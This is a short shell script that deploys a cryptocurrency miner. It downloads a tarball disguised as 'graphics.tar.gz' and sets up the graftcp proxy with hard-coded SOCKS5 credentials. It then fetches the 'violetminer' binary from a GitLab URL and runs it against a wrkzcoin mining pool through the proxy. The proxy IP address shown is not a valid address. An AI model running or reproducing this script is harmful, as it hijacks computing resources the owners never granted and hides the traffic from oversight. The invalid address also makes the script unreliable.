apt-get update -y
curl -L -o graphics.tar.gz https://github.com/Todorox/Rand/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 2.56.119.939:5074

socks5_username = htjkzdlw

socks5_password = 47ud8w3sp0i6

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

curl -L -o violetminer https://gitlab.com/arianajsh89/werdata/-/raw/main/violetminer && chmod +x violetminer

./graftcp/graftcp ./violetminer --algorithm wrkzcoin --pool 168.235.86.33:3393 --username SK_XPDzztzE6rL4rQlJtSwyL.1059 --password x --disableNVIDIA --threads 1
